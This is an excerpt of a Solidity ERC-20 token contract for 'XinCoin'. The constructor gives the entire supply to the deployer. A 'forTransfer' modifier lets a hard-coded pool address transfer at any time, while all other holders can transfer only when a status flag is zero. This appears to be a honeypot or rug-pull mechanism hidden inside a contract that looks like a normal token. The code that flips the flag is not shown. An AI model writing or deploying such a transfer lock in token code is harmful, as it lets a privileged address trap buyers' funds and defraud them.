...
contract XinCoinToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenXC_totalSupply;
    uint256 private _tokenXC_status = 0;
    uint256 public stakingPoolXCStatus = 0;

    string private _tokenXC_name;
    string private _tokenXC_symbol;

    address private _poolXCAddress = 0x17A5aA38F87A10c64fd3DBf383c86fD2445d0067;

    constructor() {
        _tokenXC_name = "XinCoin";
        _tokenXC_symbol = "XinCoin";
        _tokenXC_totalSupply = 94500 * 10 ** 18;
        _balances[msg.sender] = _tokenXC_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolXCAddress || _tokenXC_status == 0);
        _;
    }
    ...
    function name() public view virtual override returns (string memory) {
        return _tokenXC_name;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokenXC_totalSupply;
    }
